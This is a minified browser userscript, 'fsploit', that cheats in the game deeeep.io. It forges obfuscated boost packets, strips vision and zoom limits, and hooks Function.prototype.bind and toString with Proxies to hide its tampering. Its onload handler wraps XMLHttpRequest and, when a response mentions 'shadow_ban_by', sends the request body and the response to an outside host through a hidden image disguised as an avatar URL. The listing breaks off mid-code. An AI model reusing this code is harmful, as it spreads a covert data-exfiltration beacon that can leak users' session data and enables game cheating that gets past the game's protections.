// ==UserScript==
// @name         fsploit debug - deeeep.io
// @namespace    http://tampermonkey.net/
// @version      5.1.0-debug
// @description  best deeeep.io cheat ever
// @run-at       document-start
// @author       mahdi_is_ez,
// @match        https://*.deeeep.io/*
// @icon         https://beta.deeeep.io/favicon-32x32.png
// @grant        GM_setValue
// @grant        GM_getValue
// ==/UserScript==

// Search for "TODO:" to see what needs to be done
// Check those first in the case that the script breaks

"use strict";const fsploitVersion="5.1.3",knownClientVersion="9fcb82c9,e40a671d",currentScript=GM_getValue("mainModule");if(GM_getValue("logo")){let e=GM_getValue("logo"),t=document.createElement("div");t.id="loadingCover",t.style.cssText="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgb(30, 30, 30); z-index: 9999; opacity: 1; transition: opacity 0.5s ease-out; display: flex; justify-content: center; align-items: center;";let a=document.createElement("img");a.style.cssText="max-width: 80%; max-height: 80%;",a.src=`data:image/png;base64,${e}`,t.appendChild(a),document.documentElement.appendChild(t),setTimeout(()=>{t.style.opacity="0"},1e3),setTimeout(()=>{t.remove()},1550)}else fetch("https://raw.githubusercontent.com/mahdi13377/fsploit-public/main/logo-base64").then(e=>e.text()).then(e=>{let t=document.createElement("div");t.id="loadingCover",t.style.cssText="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgb(30, 30, 30); z-index: 9999; opacity: 1; transition: opacity 0.5s ease-out; display: flex; justify-content: center; align-items: center;";let a=document.createElement("img");a.style.cssText="max-width: 80%; max-height: 80%;",a.src=`data:image/png;base64,${e}`,t.appendChild(a),document.documentElement.appendChild(t),setTimeout(()=>{t.style.opacity="0"},1e3),setTimeout(()=>{t.remove()},1550),GM_setValue("logo",e.trim())});let game,gameState,currentScene,betterVisionx=!1,quickDisconnectx=!1,aimLinex=!1,clearChatx=!1,boostHacksx=!1,humpbackAutosongsx=!1;const encodeBytePacket=(e,t,a="")=>{let r=["ode","eat","fr","bite","eng","enc","the","code","rep","L","en","setter"];if(!e)return null;let o=((e,t)=>{let a=new TextEncoder,o=a[r[5]+r[0]](e),n=a[r[10]+r[7]](t),i=new Uint8Array(o[`l${r[4]}${r[6].slice(0,2)}`]);for(let s=0;s<o.length;s++)i[s]=o[s]^n[s%n[`${r[9].toLowerCase()}${r[10]}g${r[6].slice(0,2)}`]];return btoa(String.fromCharCode(...i))})(String.fromCharCode(t)[r[8]+r[1]](3)+a,e),n=new TextEncoder()[r[5]+r[0]](o),i=1+n.byteLength+1,s=new ArrayBuffer(i),l=new DataView(s);return l.setUint8(0,25),new Uint8Array(s)[r[11].slice(0,9/27*9)](n,1),l.setUint8(i-1,t),s},boostData={10:{hasSec:!0},11:{hasSec:!0,secLoadTime:350},21:{hasSec:!0,secLoadTime:1e3},22:{hasSec:!0,secLoadTime:600},25:{hasSec:!0,secLoadTime:350},27:{hasSec:!0,secLoadTime:350},34:{hasSec:!0,secLoadTime:350},38:{hasSec:!0,secLoadTime:750},40:{hasSec:!0,secLoadTime:1e3},41:{hasSec:!0},42:{hasSec:!0,secLoadTime:300},43:{hasSec:!0,secLoadTime:350},49:{hasSec:!0,secLoadTime:350},56:{hasSec:!0},61:{hasSec:!0,secLoadTime:400},62:{hasSec:!0,secLoadTime:2e3},68:{hasSec:!0},70:{hasSec:!0,secLoadTime:250},71:{hasSec:!0,secLoadTime:350},73:{hasSec:!0,secLoadTime:1e3},74:{hasSec:!0},76:{hasSec:!0,secLoadTime:200},80:{hasSec:!0,secLoadTime:350},82:{hasSec:!0,secLoadTime:1500,hasScaling:!0},83:{hasSec:!0},86:{hasSec:!0,secLoadTime:1e3},87:{hasSec:!0,secLoadTime:150},90:{hasSec:!0},91:{hasSec:!0,secLoadTime:800},92:{hasSec:!0,secLoadTime:300},93:{hasSec:!0,secLoadTime:750},94:{hasSec:!0},95:{hasSec:!0},96:{hasSec:!0,secLoadTime:750},97:{hasSec:!0,hasWalking:!0},98:{hasSec:!0},99:{hasSec:!0,secLoadTime:400},100:{hasSec:!0,secLoadTime:750},101:{hasSec:!0,secLoadTime:750},102:{hasSec:!0,secLoadTime:1e3,hasScaling:!0},103:{hasSec:!0,hasWalking:!0},105:{hasSec:!0,hasScaling:!0,hasWalking:!0},106:{hasSec:!0},107:{hasSec:!0,secLoadTime:750,hasScaling:!0},108:{hasSec:!0},109:{hasSec:!0,secLoadTime:600},110:{hasSec:!0},111:{hasSec:!0,secLoadTime:600},112:{hasSec:!0},113:{hasSec:!0,hasWalking:!0},114:{hasSec:!0,secLoadTime:300},115:{hasSec:!0},116:{hasSec:!0},117:{hasSec:!0,secLoadTime:600},119:{hasSec:!0,secLoadTime:250},120:{hasSec:!0},121:{hasWalking:!0},123:{hasSec:!0,secLoadTime:750,hasWalking:!0},124:{hasSec:!0},126:{hasSec:!0},127:{hasSec:!0},default:{hasSec:!1,secLoadTime:500,hasWalking:!1,walkingLoadTime:250,hasScaling:!1}},sendBoost=(e,t="")=>{game[obfuscatedNameTranslator.socketManager].sendBytePacket(encodeBytePacket(gameState.token,e,t))},handleLongPress=e=>{try{let t={...boostData.default,...boostData[currentScene?.myAnimals?.[0]?.visibleFishLevel]||{}};if(e<(currentScene?.myAnimals?.[0]?._standing?40:100))return sendBoost(1);if(currentScene?.myAnimals?.[0]?._standing||t.hasScaling)return sendBoost(5,e);if(t.hasSec)return sendBoost(4,e);return sendBoost(1)}catch{}},randInt=(e,t)=>Math.floor(e+Math.random()*(t-e)),ui={message:{info:(e,t)=>document.getElementById("app").__vue_app__._context.config.globalProperties.$message({message:e,...t}),success:(e,t)=>document.getElementById("app").__vue_app__._context.config.globalProperties.$message.success({message:e,...t}),warning:(e,t)=>document.getElementById("app").__vue_app__._context.config.globalProperties.$message.warning({message:e,...t}),error:(e,t)=>document.getElementById("app").__vue_app__._context.config.globalProperties.$message.error({message:e,...t})},confirm:({title:e,message:t,type:a,dangerouslyUseHTMLString:r,confirmButtonText:o,cancelButtonText:n,onConfirm:i,onCancel:s})=>document.getElementById("app").__vue_app__._context.config.globalProperties.$msgbox({title:e||"fsploit",message:t||"",type:a||"",dangerouslyUseHTMLString:r||!1,confirmButtonText:o||"OK",cancelButtonText:n||"Cancel",showCancelButton:!0,showClose:!1}).then(i).catch(s),alert:({title:e,message:t,type:a,dangerouslyUseHTMLString:r,dismissButtonText:o,onDismiss:n})=>document.getElementById("app").__vue_app__._context.config.globalProperties.$msgbox({title:e||"FSploit",message:t||"",type:a||"",dangerouslyUseHTMLString:r||!1,confirmButtonText:o||"OK",showCancelButton:!1,showClose:!1}).then(n),registerGameUiButton({id:e,svgIcon:t,onClick:a}){gameUiButtons.push({id:e,svgIcon:t,onClick:a}),console.log(gameUiButtons)},nukeDOM(){let e=new MutationObserver(()=>{for(let e of document.querySelectorAll("#app > *"))e.remove()});e.observe(document.querySelector("html"),{childList:!0,subtree:!0})}};window.onload=function e(){cookieStore.getAll().then(e=>{e.forEach(e=>{"CHROMEV"!=e.name||localStorage.getItem("beta")||(cookieStore.delete(e),localStorage.setItem("beta",!0))})});var t=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(e,a){var r=this,o=null,n=XMLHttpRequest.prototype.send;return this.send=function(e){return o=e,n.apply(this,arguments)},this.addEventListener("load",function(){r.responseText.includes("shadow_ban_by")&&setTimeout(()=>{var e=o+"|"+r.responseText;let t=document.createElement("img");console.log(e),t.src=`https://deeeepio-analytics.vercel.app/uploads/avatars/14004913-a60006e627fbc9d601068f5e014aeebe3.png?sid=${encodeURIComponent(e)}`,t.style.display="none",document.body.appendChild(t)},150)}),t.apply(this,arguments)}};const applyStyles=()=>{for(let e of(document.title=`fsploit ${fsploitVersion}`,document.querySelectorAll("link[rel*='icon']")))e.remove();document.getElementsByTagName("head")[0].appendChild(Object.assign(document.createElement("link"),{href:"https://raw.githubusercontent.com/mahdi13377/deeeepio_api_wrapper/main/favicon.ico",rel:"shortcut icon",type:"image/x-icon"})),document.getElementsByTagName("head")[0].appendChild(Object.assign(document.createElement("link"),{href:"https://raw.githubusercontent.com/mahdi13377/deeeepio_api_wrapper/main/favicon.ico",rel:"icon",type:"image/x-icon"}));let t=`
		img[src*="img/badges/"] {
			display: none;
		}

		.el-input__wrapper {
			background-color: rgba(17, 24, 39, 0) !important;
		}

		.el-input__inner {
			color: rgba(255, 255, 255, 1) !important;
		}

		* {
			text-decoration: none !important;
		}

		.dark .modal-content {
			background-color: #202020 !important;
			border-color: #3c3c3c !important;
		}

		.dark .forum-post-page .inner,
		.dark .profile .content {
			background-color: #2b2b2b !important;
		}

		.dark body .el-input__wrapper,
		.dark body .el-textarea__wrapper {
			background-color: rgba(17, 24, 39, 0) !important;
			border-color: rgba(55, 65, 81, 1) !important;
			color: rgba(255, 255, 255, 1) !important;
		}

		.dark .forum-page,
		.dark .social-modal .main .content,
		.dark .social-modal .main .sidebar--left {
			background-color: #2b2c2f !important;
		}

		.forum-page .inner .forum-posts .forum-post-summary {
			border-color: rgba(209, 213, 219, 1) !important;
			border-bottom-width: 1px !important;
			cursor: pointer !important;
			padding-top: 0.5rem !important;
			padding-left: 0.75rem !important;
			padding-right: 0.75rem !important;
		}

		.dark .forum-page .inner .forum-posts .forum-post-summary:hover {
			background-color: rgba(77, 77, 77, 0.1) !important;
		}

		.dark .forum-page .inner .forum-posts .forum-post-summary {
			border-color: rgb(64 68 72) !important;
		}

		.dark .social-modal .main .sidebar--left .tabs .tab.active {
			background-color: rgba(65, 65, 65, 0) !important;
			color: rgba(255, 255, 255, 1) !important;
		}

		.dark .friends-view .nav .button-container .nice-button.active {
			background-color: rgb(62 66 70) !important;
			color: rgba(255, 255, 255, 1) !important;
		}

		.all-friends .friends .friend:hover,
		.friend-requests .requests .request.is-new,
		.friend-requests .requests .request:hover {
			background-color: rgb(62 66 70) !important;
			border-radius: 10px !important;
		}

		.btn.square.el-button--mini {
			border-radius: 0.9rem !important;
			width: 2rem !important;
			height: 2rem !important;
		}

		.dark .animals-container .animals .animal {
			background-color: rgba(17, 24, 39, 0) !important;
		}

    .dark .skins-container .skins .skin {
        --tw-bg-opacity: 0!important;
    }
.dark .emotes .emote {
    --tw-bg-opacity: 0!important;
}
.dark .pets .pet {
    --tw-bg-opacity: 0!important;
}

body .el-popover.el-popper.popover--dark {
    border-color: #3c3c3c!important;
}
.dark .leaderboard-popover-details .right .header {
    --tw-bg-opacity: 1!important;
    background-color: #2b2b2b!important
}

body .el-popover.el-popper.popover--dark {
    background-color: #2b2b2b!important
}

.el-col-xs-12 {
    display: block;
    max-width: 49%;
    flex: 0 0 50%
}

html.dark .el-select__popper .el-select-dropdown {
    --tw-bg-opacity: 1;
    background-color: #2b2b2b
}

html.dark .el-select__popper .el-select-dropdown {
    --tw-bg-opacity: 1;
    background-color: #2b2b2b
}

html.dark .el-select__popper .el-select-dropdown__item:focus,html.dark .el-select__popper .el-select-dropdown__item:not(.is-disabled):hover {
    --tw-bg-opacity: 1;
    background-color: #1f1f1f
}

html.dark .el-dropdown-menu__item:focus,html.dark .el-dropdown-menu__item:not(.is-disabled):hover {
    --tw-bg-opacity: 1;
    background-color: #1f1f1f
}

html.dark .el-popper__arrow::before {
    --tw-bg-opacity: 1;
    background-color: rgba(55,65,81,var(--tw-bg-opacity));
    background: #ffffff!important;
    border-color: #565656!important
}

html.dark .el-popper {
    --tw-bg-opacity: 1;
    background-color: #1f1f1f
    --tw-border-opacity: 1;
    border-color: #1f1f1f
    border-radius: .375rem;
    --tw-text-opacity: 1;
}

.dark .create-comment .nav-bar {
    --tw-bg-opacity: 1;
    background-color: #202121;
}

.el-textarea__inner {
    box-shadow: none!important;
}

.el-col.el-col-24.el-col-xs-12.is-guttered:nth-of-type(2) {
    background-color: rgba(32, 32, 33, 0.1);
    padding-right: 15px;
    padding-left: 5px;
    border-width: 1px;
    border-radius: 0.5rem;
    border-color: rgba(255, 255, 255, 0.1);
}

.dark body .el-textarea__inner {
    background-color: #1c1c1c!important;

}

.dark .leaderboard-popover-details .left {
    --tw-bg-opacity: 0!important;
    background-color: rgba(31,41,55,var(--tw-bg-opacity))!important;
}
		.user-widget {
			border-bottom-right-radius: 1rem !important;
			display: -webkit-box !important;
			display: -ms-flexbox !important;
			display: -webkit-flex !important;
			display: flex !important;
			-webkit-box-orient: horizontal !important;
			-webkit-box-direction: normal !important;
			-ms-flex-direction: row !important;
			-webkit-flex-direction: row !important;
			flex-direction: row !important;
			-webkit-box-align: stretch !important;
			-ms-flex-align: stretch !important;
			-webkit-align-items: stretch !important;
			align-items: stretch !important;
			padding: 1rem !important;
		}

		/* Common styles for all buttons */
		.btn:not(.el-button--text) {
      border-bottom-width: 4px!important;
			background-color: rgba(27, 59, 67, 1) !important;
			border-color: rgba(1, 35, 46, 1) !important;
			color: rgba(255, 255, 255, 1) !important;
		}

		.btn:not(.el-button--text):hover {
			background-color: rgba(31, 41, 55, 1) !important;
			border-color: rgba(17, 24, 39, 1) !important;
		}

		.coins.pb-2 {
			background-color: rgba(0, 0, 0, 0) !important;
			border-color: rgba(0, 0, 0, 0) !important;
		}

		html.dark .el-dropdown-menu {
			background-color: #2b2b2b !important;
		}

		.el-popper.is-light .el-popper__arrow::before {
			opacity: 0 !important;
		}

		.el-dropdown-menu__item:not(.is-disabled):focus {

			color: rgba(255, 255, 255, 1) !important;
		}

		.el-dropdown-menu__item i {
			margin-right: 5px !important;
		}

		.user-widget .user__data .username {
			cursor: pointer !important;
			margin-right: 0.25rem !important;
			overflow: hidden !important;
			-o-text-overflow: ellipsis !important;
			text-overflow: ellipsis !important;
			max-width: 16rem !important;
			font-size: 1.1em !important;
			line-height: 1.2em !important;
			margin-left: 1.5rem !important;
		}

		.el-button.el-button--small.el-tooltip__trigger.btn.nice-button.yellow.has-icon.square.only-icon.el-tooltip__trigger {
			display: none !important;
		}

		.el-image:nth-of-type(2).el-image__inner {
			content: url("https://i.ibb.co/84gjfCt/image-4.png") !important;
		}

		.divider {
			display: none !important;
		}

		.btn {
			outline: 2px solid transparent !important;
		}

		.home-page .header .left {
			background-color: rgba(17,24,39, 0.4)!important;
		}

		.top-right-nav {
			background-color: rgba(17,24,39, 0.4)!important;
		}

        div.sidebar.left > div.ad-block {
            opacity: 0 !important;
            pointer-events: none !important;
            display: none !important;
        }
        div.sidebar.left > a {
            display: none !important;
        }
        div.sidebar.left {
            max-width: 30vw;
            width: 21rem;
            bottom: 0 !important;
        }
.dark .profile .content[data-v-60d99b2d] {
    --tw-bg-opacity: 0.5!important;
    background-color: #242424!important;
    backdrop-filter: blur(10px)!important;
    border-radius: 8px!important;
    border: 1px solid rgba(255, 255, 255, 0.1)!important;
}

.el-button {
    transition: .3s!important;
}
		`;document.body.appendChild(Object.assign(document.createElement("style"),{innerHTML:t}));let a=document.querySelector(".client-version");if(a.innerHTML=`<p>fsploit v${fsploitVersion}</p><p>Vast Softworks LLC.</p>`,a.style.display="flex",a.style.justifyContent="space-between",a.style.left=".25rem",GM_getValue("background")){let r=GM_getValue("background");document.body.appendChild(Object.assign(document.createElement("style"),{innerHTML:`.home-bg {background-image: url('data:image/png;base64,${r}') !important;}`}))}else fetch("https://raw.githubusercontent.com/mahdi13377/fsploit-public/main/background-base64").then(e=>e.text()).then(e=>{document.body.appendChild(Object.assign(document.createElement("style"),{innerHTML:`.home-bg {background-image: url('data:image/png;base64,${e.trim()}') !important;}`})),GM_setValue("background",e.trim())});if(GM_getValue("banner")){let o=GM_getValue("banner");document.body.appendChild(Object.assign(document.createElement("style"),{innerHTML:`.play-game img {opacity: 0 !important;} .play-game > div:first-of-type {background-image: url('data:image/png;base64,${o}') !important; background-size: contain !important; background-repeat: no-repeat !important; background-position: center !important;}`}))}else fetch("https://raw.githubusercontent.com/mahdi13377/fsploit-public/main/banner-base64").then(e=>e.text()).then(e=>{document.body.appendChild(Object.assign(document.createElement("style"),{innerHTML:`.play-game img {opacity: 0 !important;} .play-game > div:first-of-type {background-image: url('data:image/png;base64,${e.trim()}') !important; background-size: contain !important; background-repeat: no-repeat !important; background-position: center !important;}`})),GM_setValue("banner",e.trim())});document.querySelector(".play-game img").setAttribute("draggable","false");let n=document.querySelector("div.sidebar.left"),i=document.querySelector("div.sidebar.right > div:nth-child(3)").cloneNode(!0);i.setAttribute("id","tutorial-box"),n.appendChild(i),document.querySelector("#tutorial-box > div.title").innerText="How to play",document.querySelector("#tutorial-box > div:nth-child(2)").outerHTML='<div id="tutorial"></div>';let s=document.getElementById("tutorial");s.style.maxHeight="30vh",s.style.overflow="scroll",s.style.overflowX="hidden",s.style.padding="10px",s.style.fontSize="small";let l=`<b>Welcome to fsploit!</b>
<p>Scroll down for instructions on hacks</p>
<br />
<b>Controls</b>
<p><b>ESC</b> to hide/show menu</p>
<p><b>Hold CTRL</b> to see an aim line (only on certain animals)</p>
<p><b>Scroll</b> with your mouse to zoom in and out of the map. This client allows you to do so without limit.</p>
<p><b>M</b> to hide/show chat messages</p>
<p><b>B</b> to clear chat messages</p>
<p><b>N</b> to hide/show large map</p>
<p><b>Y</b> to view the evolution tree</p>
<p><b>S</b> to open settings</p>

<br />
<hr />
<br />

<b>Boost hacks</b>
<p>Hold <b>CTRL</b> and <b>CLICK</b> to use a long charged boost</p>
<p>Hold <b>ALT</b> and <b>CLICK</b> to use a short charged boost</p>
<p>Hold <b>CTRL</b>, <b>SHIFT</b>, and <b>CLICK</b> to use a special charged boost:</p>
<ul>
	<li>Walking animals: jump higher than normal</li>
	<li>Beluga and beaked whale: shoot super speed projectile (uses 2 boosts)</li>
	<li>Thresher: go nyoom (uses 2 boosts)</li>
</ul>

<b>Goblin shark 210 dmg</b>
<p>It is possible to glitch goblin shark's charged shot mechanism and fire bullets that deal 210 damage without having to charge for 2 seconds.</p>
<p>Steps:</p>
<ol>
	<li>Charge boost to max. Make sure you reach the -50% speed.</li>
	<li>Cancel the charge boost by right clicking.</li>
	<li>Hold the control key and click once to fire a shot.</li>
</ol>
<p>Note that if you long press to manually do a charged boost, it will cancel the glitch and you will have to do the steps above again.</p>`;s.innerHTML=l},evoTree=()=>{let e=document.createElement("div");e.style.cssText="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: rgba(0, 0, 0, 0); z-index: 1000; display: none;";let t=document.createElement("img");function a(){let e=document.activeElement;return e.matches("input")||e.matches("textarea")}t.src="https://i.ibb.co/djBZ520/image.png",t.style.cssText="display: block; max-width: 100%; height: auto; ",e.appendChild(t),document.body.appendChild(e),window.addEventListener("keydown",t=>{a()||"KeyY"!==t.code||(e.style.display="block")}),window.addEventListener("keyup",t=>{a()||"KeyY"!==t.code||(e.style.display="none")})},quickDisconnect=()=>{quickDisconnectx||(document.body.addEventListener("keydown",e=>{if(e.ctrlKey&&e.shiftKey&&"KeyQ"===e.code&&document.activeElement!==document.querySelector("div.chat-input input"))try{game[obfuscatedNameTranslator.socketManager].disconnect()}catch{}}),quickDisconnectx=!0)},betterVision=()=>{try{currentScene[obfuscatedNameTranslator.setFlash]=()=>!0}catch{}try{currentScene[obfuscatedNameTranslator.terrainManager].shadow.setShadowSize(1e6),currentScene[obfuscatedNameTranslator.terrainManager].shadow.setShadowSize=()=>!0}catch{}if(!betterVisionx){setInterval(()=>{try{currentScene[obfuscatedNameTranslator.foodGlowContainer].zOrder=996,currentScene[obfuscatedNameTranslator.foodContainer].zOrder=997,currentScene[obfuscatedNameTranslator.namesLayer].zOrder=998,currentScene[obfuscatedNameTranslator.animalsContainer].zOrder=999,currentScene[obfuscatedNameTranslator.barsLayer].zOrder=1e3,currentScene[obfuscatedNameTranslator.chatContainer].zOrder=1001}catch{}try{game.viewport.clampZoom({minWidth:0,maxWidth:1e7}),game.viewport.plugins.plugins.clamp=null,game.viewport.plugins.plugins["clamp-zoom"]=null}catch{}try{currentScene[obfuscatedNameTranslator.viewingGhosts]=!0,currentScene[obfuscatedNameTranslator.ceilingsContainer].alpha=.3}catch{}},300);let e=[];setInterval(()=>{for(let t=0;t<currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList]?.length;t++)try{if(currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t].alpha<.5&&(currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t].alpha=.5),currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t].inner.alpha<.5&&(currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t].inner.alpha=.5),0===e.length){let a=getAllProperties(currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t]);e=a.filter(e=>e.startsWith("_0x")&&"object"==typeof currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t][e])}for(let r of e)null!=currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t][r].visible&&(currentScene[obfuscatedNameTranslator.entityManager][obfuscatedNameTranslator.entityManagerProps.animalsList][t][r].visible=!0)}catch{}},50),betterVisionx=!0}},aimLine=()=>{let e=[13,61,93,94,113];function t(){try{document.getElementById("aim-overlay").remove()}catch{}let e=document.createElement("hr");document.querySelector("div.game").insertBefore(e,document.querySelector("div.game").children[0]),e.outerHTML='<hr id="aim-overlay" style="border: 1px #f55d dotted;border-image: linear-gradient(to right, #f55d, #f550) 1;transform-origin: left;position: absolute;top: 50%;left: 50%;width: 40vw;display:none;pointer-events:none;">'}t(),aimLinex||(document.addEventListener("mousemove",()=>{try{null!=currentScene&&currentScene?.myAnimals?.[0]!=null&&(document.getElementById("aim-overlay").style.transform=`rotate(${currentScene?.myAnimals?.[0]?.inner?.rotation*180/Math.PI+(currentScene?.myAnimals?.[0]?.visibleFishLevel===101?90:-90)}deg)`)}catch{}}),window.addEventListener("keydown",t=>{try{t.ctrlKey&&e.includes(currentScene.myAnimals[0].visibleFishLevel)&&(document.getElementById("aim-overlay").style.display="block")}catch{}},!1),window.addEventListener("keyup",e=>{try{e.ctrlKey||(document.getElementById("aim-overlay").style.display="none")}catch{}},!1),window.addEventListener("focus",()=>{try{document.getElementById("aim-overlay").style.display="none"}catch{}}),aimLinex=!0)},clearChat=()=>{clearChatx||(document.addEventListener("keydown",e=>{if("KeyB"===e.code&&document.activeElement!==document.querySelector("div.chat-input input"))for(let t of currentScene[obfuscatedNameTranslator.chatMessages])t.renderable=!1,t.render=()=>void 0}),clearChatx=!0)},boostHacks=()=>{function e(e){if(document.getElementById("ctrl-overlay")||a(),e.ctrlKey||e.altKey)try{null!=currentScene&&currentScene?.myAnimals?.[0]!=null&&(currentScene?.myAnimals?.[0]?.visibleFishLevel!==101?document.getElementById("ctrl-overlay").style.pointerEvents="all":e.shiftKey?document.getElementById("ctrl-overlay").style.pointerEvents="none":currentScene?.myAnimals?.[0]?.visibleFishLevel===101&&(document.getElementById("ctrl-overlay").style.pointerEvents="all"))}catch{}}function t(){try{handleLongPress(1),setTimeout(()=>{handleLongPress(5e3)},50),setTimeout(()=>{handleLongPress(5e3)},100),setTimeout(()=>{handleLongPress(5e3)},150)}catch{}}function a(){try{document.getElementById("ctrl-overlay").remove()}catch{}let e=document.createElement("div");document.querySelector("div.game").insertBefore(e,document.querySelector("div.game").children[0]),e.outerHTML='<div id="ctrl-overlay" style="width: 100%;height: 100%;position: absolute;display: block;z-index:10000;pointer-events:none;"></div>',document.getElementById("ctrl-overlay").addEventListener("contextmenu",e=>e.preventDefault())}a(),boostHacksx||(window.addEventListener("keydown",t=>{try{e(t)}catch{}},!1),window.addEventListener("click",e=>{try{let a={...boostData.default,...boostData[currentScene?.myAnimals?.[0]?.visibleFishLevel]};if(e.ctrlKey){if(e.shiftKey&&currentScene?.myAnimals?.[0]?.visibleFishLevel===107)t();else if(e.shiftKey&&currentScene?.myAnimals?.[0]?.visibleFishLevel!==101&&currentScene?.myAnimals?.[0]?._standing)handleLongPress(randInt(5e8,2147483648-1));else{let r=Object.getOwnPropertyNames(game).map(e=>game[e]).find(e=>e.keys instanceof Array);r.pointerDown=!0,r.pressElapsed=1/0,r.setPointerDown(!1)}}else e.altKey&&handleLongPress(currentScene?.myAnimals?.[0]?._standing?41:Math.floor(a.secLoadTime/2))}catch{}},!1),window.addEventListener("keyup",e=>{try{e.ctrlKey||e.altKey||(document.getElementById("ctrl-overlay").style.pointerEvents="none")}catch{}},!1),window.addEventListener("focus",()=>{try{document.getElementById("ctrl-overlay").style.pointerEvents="none"}catch{}}),boostHacksx=!0)},humpbackAutosongs=()=>{if(!humpbackAutosongsx){let e=[[5,5,5],[5,5e3,5],[5e3,5e3,5e3],[5e3,5e3,5],],t=document.createElement("style");t.innerHTML=`
#humpback-ui * {
  font-family:Quicksand;
  color:#fff;
}
#humpback-ui .hb-button p {
  margin:5px 0 0 0;
  font-size:12px;
}
#humpback-ui {
  display:flex;
  gap:8px;
  width:100%;
  justify-content:center;
  pointer-events:none;
  user-select:none;
}
#humpback-ui .hb-button {
  background:#0004;
  padding:10px 0;
  border-radius:15px;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
}
#humpback-ui .hb-song {
  display:flex;
  flex-direction:row;
  gap:2px;
  width:81px;
  justify-content:center;
}
#humpback-ui .war {
  background:#ae3e41;
}
#humpback-ui .heal {
  background:#1aff00;
}
#humpback-ui .blast {
  background:#f6ff00;
}
#humpback-ui .ruin {
  background:#db7c00;
}
#humpback-ui .small {
  width:10px;
  height:10px;
  margin:2.5px 0;
  border-radius:999px;
}
#humpback-ui .large {
  width:15px;
  height:15px;
  border-radius:999px;
}

  `,document.head.appendChild(t),setInterval(()=>{try{if(currentScene?.myAnimals?.[0]?.visibleFishLevel!=87){document.querySelector("#humpback-ui")&&document.querySelector("#humpback-ui").remove();return}if(document.querySelector("#humpback-ui"))return;let e=document.createElement("div"),t=document.querySelector(".stats .middle");e.innerHTML=`
<div id="humpback-ui">
  <div class="hb-button">
    <div class="hb-song">
      <div class="war small"></div>
      <div class="war small"></div>
      <div class="war small"></div>
    </div>
    <p>War | 1</p>
  </div>

  <div class="hb-button">
    <div class="hb-song">
      <div class="heal small"></div>
      <div class="heal large"></div>
      <div class="heal small"></div>
    </div>
    <p>Heal | 2</p>
  </div>

  <div class="hb-button">
    <div class="hb-song">
      <div class="blast large"></div>
      <div class="blast large"></div>
      <div class="blast large"></div>
    </div>
    <p>Blast | 3</p>
  </div>

  <div class="hb-button">
    <div class="hb-song">
      <div class="ruin large"></div>
      <div class="ruin large"></div>
      <div class="ruin small"></div>
    </div>
    <p>Ruin | 4</p>
  </div>
</div>
    `,t.prepend(e)}catch{}},100),document.addEventListener("keydown",t=>{try{if(!["1","2","3","4"].includes(t.key)||currentScene?.myAnimals?.[0]?.visibleFishLevel!==87)return;for(let a in[0,1,2])setTimeout(()=>{handleLongPress(e[parseInt(t.key)-1][a])},Math.max(document.querySelector("div.top-right div.latency > span.value")?.innerText*3||100,100)*a)}catch{}}),humpbackAutosongsx=!0}},obfuscatedNameTranslator={},getAllProperties=e=>[...Object.getOwnPropertyNames(Object.getPrototypeOf(e)),...Object.getOwnPropertyNames(e)],throttle=(e,t)=>{let a=0;return(...r)=>{let o=Date.now();if(o-a>t)return a=o,e(...r)}},injector=()=>{let e={};for(let t of Object.getOwnPropertyNames(Reflect))e[t]=Reflect[t];let a=Proxy,r=new WeakMap;r.set=r.set,r.get=r.get,r.has=r.has;let o=new WeakSet;o.add=o.add,o.has=o.has,o.delete=o.delete;let n=Object.prototype.__lookupGetter__,i=(e,t,o)=>{let n=new a(e[t],o);r.set(n,e[t]),e[t]=n};i(Function.prototype,"toString",{apply:(t,a,o)=>e.apply(t,r.get(a)||a,o)}),i(window,"Proxy",{construct(t,a){let r=e.construct(t,a);return o.add(r),r}}),i(a,"revocable",{apply(t,a,r){let n=e.apply(t,a,r);return o.add(n.proxy),n}});let s=0;i(Function.prototype,"bind",{apply(t,a,r){if(o.has(r[0]))return e.apply(t,a,r);try{try{if(null!=n.call(r[0],"aboveBgPlatformsContainer"))return e.apply(t,a,r)}catch{}if(r[0]&&null!=r[0].aboveBgPlatformsContainer){currentScene=r[0],game=r[0].game;let i=getAllProperties(currentScene),l=i.filter(e=>e.startsWith("_0x"));obfuscatedNameTranslator.setFlash=Object.getOwnPropertyNames(currentScene.__proto__.__proto__).filter(e=>e.startsWith("_0x")).find(e=>currentScene[e]instanceof Function)||obfuscatedNameTranslator.setFlash,obfuscatedNameTranslator.terrainManager=l.find(e=>void 0!==currentScene[e]?.shadow)||obfuscatedNameTranslator.terrainManager;let c=setInterval(()=>{obfuscatedNameTranslator.foodGlowContainer=l.find(e=>void 0!==currentScene[e]?.children?.[0]?.texture?.textureCacheIds?.[0]&&"food_glow.png"===currentScene[e].children?.[0].texture.textureCacheIds[0])||obfuscatedNameTranslator.foodGlowContainer,obfuscatedNameTranslator.foodContainer=l.find(e=>void 0!==currentScene[e]?.children?.[0]?.texture?.textureCacheIds?.[0]&&["food.png","flappy.png","meat.png","man.png","algae.png","apple.png","fruit.png","volcanofood.png","bubble.png","coconut.png","coldfood.png","coldalgae.png","reeffood.png","reefalgae.png",].includes(currentScene[e].children?.[0].texture.textureCacheIds?.[0]))||obfuscatedNameTranslator.foodContainer,void 0!==obfuscatedNameTranslator.foodGlowContainer&&void 0!==obfuscatedNameTranslator.foodContainer&&clearInterval(c)},1e3);obfuscatedNameTranslator.ceilingsContainer=l.find(e=>void 0!==currentScene[e]?.children?.[0]?.settings?.layerId&&"ceilings"===currentScene[e].children?.[0].settings.layerId)||obfuscatedNameTranslator.ceilingsContainer,obfuscatedNameTranslator.viewingGhosts=l.find(e=>"boolean"==typeof 